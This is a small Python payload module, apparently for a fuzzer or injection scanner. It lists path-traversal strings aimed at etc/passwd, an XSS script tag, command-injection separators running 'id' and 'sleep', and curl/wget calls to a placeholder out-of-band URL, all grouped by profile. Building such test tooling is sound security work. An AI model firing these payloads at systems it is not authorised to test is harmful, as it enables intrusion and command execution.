from __future__ import annotations

SAFE_PAYLOADS = [
    "",
    "A" * 64,
    "A" * 256,
    "A" * 1024,
    "-1",
    "0",
    "2147483647",
    "4294967295",
    "../" * 6 + "etc/passwd",
    "%2e%2e%2f" * 4 + "etc/passwd",
    "127.0.0.1",
    "255.255.255.255",
    "::::",
    "%00",
    "'\"`",
    "<script>alert(1)</script>",
]

CMD_LIGHT_PAYLOADS = [
    ";id",
    "&&id",
    "|id",
    "`id`",
    "$(id)",
]

CMD_TIMEOUT_PAYLOADS = [
    ";sleep 3",
    "&&sleep 3",
]

OOB_PAYLOADS = [
    ";curl -fsS {oob_url}",
    ";wget -qO- {oob_url}",
    "$(curl -fsS {oob_url})",
]


def payloads_for_profile(profile: str, oob_url: str | None = None) -> list[str]:
    payloads = list(SAFE_PAYLOADS)
    if profile in {"cmd-light", "dangerous"}:
        payloads.extend(CMD_LIGHT_PAYLOADS)
    if profile in {"cmd-timeout", "dangerous"}:
        payloads.extend(CMD_TIMEOUT_PAYLOADS)
    if profile == "dangerous":
        payloads.extend(CMD_LIGHT_PAYLOADS + CMD_TIMEOUT_PAYLOADS)
    if profile in {"oob", "dangerous"} and oob_url:
        payloads.extend(item.format(oob_url=oob_url.rstrip("/")) for item in OOB_PAYLOADS)
    return list(dict.fromkeys(payloads))
